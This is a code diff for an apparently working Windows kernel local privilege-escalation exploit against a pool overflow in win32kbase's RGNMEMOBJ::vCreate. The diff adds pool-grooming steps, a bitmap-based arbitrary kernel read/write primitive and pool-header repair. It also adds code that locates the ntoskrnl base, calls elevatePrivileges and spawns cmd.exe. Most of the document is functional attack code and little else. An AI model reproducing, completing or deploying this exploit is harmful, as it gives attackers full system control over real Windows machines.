@@ -4,6 +4,7 @@
 
 HBITMAP WORKER_BITMAP = 0;
 HBITMAP MANAGER_BITMAP = 0;
+static char BOILERPLATE_DATA[0x1000 - 0x258 + 0x50 + 0x8] = { 0 };
 
 static HBITMAP bitmaps[5000];
 
@@ -45,8 +46,8 @@ void acceleratorTableAllocationTester() {
 	int a = 0;
 	char buff[500];
 	std::fill(buff, buff + 500, 0x41);
-	for (int i = 0; i < 6; ++i) {
-		std::cout << std::hex << leakUserObjectAddress(CreateAcceleratorTableA((LPACCEL)&buff, 32 + i * 2)) << std::endl;
+	for (int i = 0; i < 5; ++i) {
+		std::cout << std::hex << leakUserObjectAddress(CreateAcceleratorTableA((LPACCEL)&buff, 20 + i * 2)) << std::endl;
 		std::cin >> a;
 		std::cout << a;
 		DebugBreak();
@@ -55,8 +56,8 @@ void acceleratorTableAllocationTester() {
 
 void bitmapAllocationTester() {
 	int a = 0;
-	for (int i = 0; i < 6; ++i) {
-		std::cout << std::hex << leakSurfaceAddress(CreateBitmap(1600, 2, 1, 8, NULL)) << std::endl;
+	for (int i = 0; i < 5; ++i) {
+		std::cout << std::hex << leakSurfaceAddress(CreateBitmap(200 + 15 * i, 1, 1, 32, NULL)) << std::endl;
 		std::cin >> a;
 		std::cout << a;
 		DebugBreak();
@@ -76,42 +77,50 @@ void groomPool() {
 	// will be the MANAGER_BITMAP, and the one following it (next memory page)
 	// will be the WORKER_BITMAP.
 
+	// Grooming step #1
+	// [-------------------------------Gh05 (0xF40)-------------------------------][--Free (0xC0)--]
 	HBITMAP bmp;
 	// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
 	for (int k = 0; k < 5000; k++) {
+		// 400 -> 0x590
 		// 800 -> 0x8b0
 		// 820 -> 0x8e0
-		// 1730 -> 0x1000
-		// 1700 -> 0xfc0
 		// 1600 -> 0xef0
+		// 1630 -> 0xf30
+		// 1640 -> 0xf40
 		// 1665 -> 0xf70
 		// 1680 -> 0xf80
 		// 1685 -> 0xf90
+		// 1695 -> 0xfb0
 		// 1700 -> 0xfc0
+		// 1730 -> 0x1000
 		// CompatibleBitmap allocation size -> cy * 4 + 0x270
 		//bmp = CreateCompatibleBitmap(GetDC(NULL), 1, 0x340);
 		// nWidth == sizlBitmap = read boundries.
-		//bmp = CreateBitmap(1665, 2, 1, 8, NULL);
-		bmp = CreateBitmap(0x1600, 2, 1, 8, NULL);
+		bmp = CreateBitmap(1640, 2, 1, 8, NULL);
 		//HDC dc = CreateCompatibleDC(NULL);
 		//SelectObject(dc, bmp);
 		bitmaps[k] = bmp;
 	}
 
-	// Utilize AcceleratorTable for an 0x110 allocation.
+	// Grooming step #2
+	// [-------------------------------Gh05 (0xF40)-------------------------------][--Usac (0xC0)--]
+	// Utilize AcceleratorTable for an 0xC0 allocation.
 	static HACCEL atsToFree[5000];
 	char buff[500];
 	std::fill(buff, buff + 500, 0x41);
 	for (int i = 0; i < 5000; ++i) {
-		atsToFree[i] = CreateAcceleratorTableA((LPACCEL)&buff, 36);
+		// 36 -> 0x110 alloc
+		// 22 -> 0xC0
+		atsToFree[i] = CreateAcceleratorTableA((LPACCEL)&buff, 22);
 	}
-	
+
 	/*for (int i = 3000; i < 3020; ++i) {
-		std::cout << i + 1 << "-\t-\tObject is located at:\t0x" << std::hex << leakUserObjectAddress(atsToFree[i]) << std::endl;
+	std::cout << i + 1 << "-\t-\tObject is located at:\t0x" << std::hex << leakUserObjectAddress(atsToFree[i]) << std::endl;
 	}
 	std::cout << std::endl;
 	for (int i = 3500; i < 3520; i++) {
-		std::cout << "Surface object is located at:\t0x" << std::hex << leakSurfaceAddress(bitmaps[i]) << std::endl;
+	std::cout << "Surface object is located at:\t0x" << std::hex << leakSurfaceAddress(bitmaps[i]) << std::endl;
 	}
 	int a = 0;
 	std::cin >> a;
@@ -119,14 +128,67 @@ void groomPool() {
 
 	for (int i = 0; i < 1000; i++) {
 		//arbitrarySizeAllocate(0x90);
-		arbitrarySizeAllocate(0x110);
+		arbitrarySizeAllocate(0xC0);
+	}
+
+	// Grooming step #3
+	// [-------------------------------Free (0xF40)-------------------------------][--Usac (0xC0)--]
+	for (int i = 1000; i < 5000; ++i) {
+		DeleteObject(bitmaps[i]);
+	}
+
+	// Grooming step #4
+	// [----------------Uscb (0x9B0)----------------][--------Free (0x590)--------][--Usac (0xC0)--]
+	for (int i = 0; i < 6000; i++) {
+		arbitrarySizeAllocate(0x9B0);
+	}
+
+	// Grooming step #5
+	// [----------------Uscb (0x9B0)----------------][--------Gh05 (0x590)--------][--Usac (0xC0)--]
+	for (int k = 0; k < 5000; k++) {
+		bmp = CreateBitmap(200, 1, 1, 32, NULL);
+		bitmaps[k] = bmp;
 	}
 	
+	// Grooming step #6
+	// [----------------Uscb (0x9B0)----------------][--------Gh05 (0x590)--------][--Free (0xC0)--]
 	for (int i = 3000; i < 5000; ++i) {
 		DestroyAcceleratorTable(atsToFree[i]);
 	}
 }
 
+
+void testAddEdgeToGET() {
+	static POINT points[0x100];
+	ULONG x = 0x1337;
+	ULONG y = 0x30;
+	//ULONG y = 0x20;
+
+	HDC hdc = GetDC(NULL);
+	HDC hMemDC = CreateCompatibleDC(hdc);
+	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
+	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
+	
+	BeginPath(hMemDC);
+	
+	for (int i = 0; i < 0x100 - 4; ++i) {
+		points[i].x = x;
+		points[i].y = y;
+	}
+	for (int i = 0x100 - 4; i < 0x100; ++i) {
+		points[i].x = x;
+		points[i].y = --y;
+
+	}
+	points[0].y = --y;
+
+	PolylineTo(hMemDC, points, 0x100);
+	// End the path
+	EndPath(hMemDC);
+
+	//DebugBreak();
+	PathToRegion(hMemDC);
+}
 
 void exploitOverflow() {
 	// The vulnerability is found at win32kbase!RGNMEMOBJ::vCreate
@@ -161,11 +223,9 @@ void exploitOverflow() {
 	//Create a Point array 
 	//static POINT points[0x3fe01];
 	static POINT points[0x3fe04];
-	ULONG x = 0xBAADF00D;
-	ULONG y = 0xDEADBEEF;
-
-	//points[0x2].x = 0xBAADF00D;
-	//points[0x2].y = 0xDEADBEEF;
+	ULONG x = 0x1;
+	//ULONG y = 0xDEADBEEF;
+	ULONG y = 0x1337;
 
 	// Note: As we don't directly control the value stored in the POINT, we cannot really overwrite pvScan0.
 	// However, we can overwrite sizlBitmap. We only need three POINTs: Two are boilerplate POINTs, which 
@@ -183,71 +243,103 @@ void exploitOverflow() {
 	//Begin path
 	BeginPath(hMemDC);
 
-	const int uniquePointsCount = 7;
-	for (int i = 0; i < uniquePointsCount; ++i) {
-		points[i].x = ++x;
-		points[i].y = ++y;
-	}
-	for (int i = uniquePointsCount; i < 0x3fe01; ++i) {
+	for (int i = 0; i < 0x3fe04; ++i) {
 		points[i].x = x;
 		points[i].y = y;
 	}
+	points[0].y = 0x20;
+	points[0].x = 0x20;
 	PolylineTo(hMemDC, points, 0x3FE01);
-	for (int i = 0; i < uniquePointsCount; ++i) {
-		points[i].x = x;
-		points[i].y = y;
-	}
+	points[0].y = y;
 	// Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
-	for (int j = 1; j < 0x156; j++) {
+	for (int j = 2; j < 0x156; j++) {
 		PolylineTo(hMemDC, points, 0x3FE01);
 	}
-	// End the path
-	EndPath(hMemDC);
-	// Fill the path
 
 	// Craft specific points.
+	const int uniquePointsCount = 0x36; // for a total ox 0x39 points coppied.
+	for (int i = 0x3fe02 - uniquePointsCount; i < 0x3fe02; ++i) {
+		//points[i].x = ++x;
+		points[i].y = --y;
+	}
+
+	//PolylineTo(hMemDC, points, 0x3FE01);
+	PolylineTo(hMemDC, points, 0x3FE02);
+	// End the path
+	EndPath(hMemDC);
 
 	// Trigger overflow.
 	groomPool();
-	DebugBreak();
+	//DebugBreak();
 	PathToRegion(hMemDC);
 }
+
+void mapHdevPage() {
+	VOID *fake = VirtualAlloc((void*)0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	memset(fake, 0x1, 0x100);
+}
+
 
 void resolveWorkerManager() {
 	char buff[0x1000] = { 0 };
 	unsigned long result = 0;
-
+	//DebugBreak();
 	for (int i = 0; i < 5000; ++i) {
 		HBITMAP currentBitmap = bitmaps[i];
-		unsigned long long address = (unsigned long long)leakSurfaceAddress(currentBitmap);
-		
+		unsigned long long address = (unsigned long long)leakSurfaceAddress(currentBitmap);		
 		result = GetBitmapBits(currentBitmap, 0x1000, buff);
-		if (result > 0xD04) {
+		if (result == 0x1000) {
 			MANAGER_BITMAP = currentBitmap;
 			for (int j = 0; j < 5000; ++j) {
 				unsigned long long workerAddress = (unsigned long long)leakSurfaceAddress(bitmaps[j]);
 				if (0x1000 == workerAddress - address) {
 					WORKER_BITMAP = bitmaps[j];
-					DebugBreak();
+					//DebugBreak();
 					break;
 				}
 			}
-			DebugBreak();
 			break;
 		}
 
 	}
 }
 
+void fixHeaders() {
+	// pvScan0 buffer is 0x258 bytes after the SURFACE header.
+	// In order to avoid crashing, we need to do the following:
+	// 1. Fix overflown (manager) bitmap's _POOL_HEADER. This can be done by copying the _POOL_HEADER of the next bitmap,
+	//    which can be retrieved by reading 0x1000 bytes from the manager's pvScan0 buffer and then copying 0x10 bytes
+	//    beginning at 0x1000 - 0x258 - 0x10.
+	// 2. Save all data between *MANAGER.pvScan0 and WORKER.pvScan0 and append to before the address whenever we want to read/write
+	//    from an address. This data is the first 0x1000 - 0x258 + 0x50 bytes we can read using our manager bitmap.
+	// TODO: fixing the pool header is a bit more compilcated than this..
+
+	char buff[0x1000] = { 0 };
+	unsigned int result = 0;
+	
+	result = GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
+	if (result != 0x1000) {
+		DebugBreak();
+	}
+
+	//DebugBreak();
+	memcpy(BOILERPLATE_DATA, buff, sizeof(BOILERPLATE_DATA) - 0x8);
+	unsigned long long address = (unsigned long long)leakSurfaceAddress(MANAGER_BITMAP) - 0x10;
+	writeQword(address, (void*)&buff[0x1000 - 0x258 - 0x10]);
+	writeQword(address + 0x8, (void*)&buff[0x1000 - 0x258 - 0x10 + 0x8]);
+}
+
 unsigned long long readQword(unsigned long long address) {
 	unsigned long long data = 0;
-	SetBitmapBits(MANAGER_BITMAP, 8, &address);
+	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
+	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
 	GetBitmapBits(WORKER_BITMAP, 8, &data);
 	return data;
 }
 
 void writeQword(unsigned long long address, void* data) {
-	SetBitmapBits(MANAGER_BITMAP, 8, &address);
+	*((unsigned long long*)&BOILERPLATE_DATA[sizeof(BOILERPLATE_DATA) - 8]) = address;
+	SetBitmapBits(MANAGER_BITMAP, sizeof(BOILERPLATE_DATA), BOILERPLATE_DATA);
 	SetBitmapBits(WORKER_BITMAP, 8, data);
 }
 
@@ -255,6 +347,7 @@ void writeQword(unsigned long long address, void* data) {
 // Copy-Pasted from HevdGdiExploitation
 unsigned long long getNtoskrnlBase() {
 	unsigned long long baseAddress = 0;
+	//DebugBreak();
 	unsigned long long ntAddress = readQword(0xffffffffffd00448) - 0x110000;
 	unsigned long long signature = 0x00905a4d;
 	unsigned long long searchAddress = ntAddress & 0xfffffffffffff000;
@@ -270,6 +363,7 @@ unsigned long long getNtoskrnlBase() {
 }
 unsigned long long PsInitialSystemProcess() {
 	unsigned long long systemProcessAddress;
+	DebugBreak();
 	unsigned long long kernelNtos = getNtoskrnlBase();
 	std::cout << "ntoskrnl.exe Base: 0x" << std::hex << kernelNtos << std::endl;
 	void* userNtos = LoadLibraryA("ntoskrnl.exe");
@@ -316,16 +410,20 @@ int main() {
 	//bitmapAllocationTester();
 	//acceleratorTableAllocationTester();
 
+	//testAddEdgeToGET();
+	
+
 	exploitOverflow();
+	mapHdevPage();
 	resolveWorkerManager();
-	//fixOverflownHeader();
-	//elevatePrivileges();
+	fixHeaders();
+	elevatePrivileges();
 
 	int a = 0;
 	std::cin >> a;
 	std::cout << a;
-	
-	DebugBreak();
+
+	system("cmd.exe");
 
 	return 0;
 }
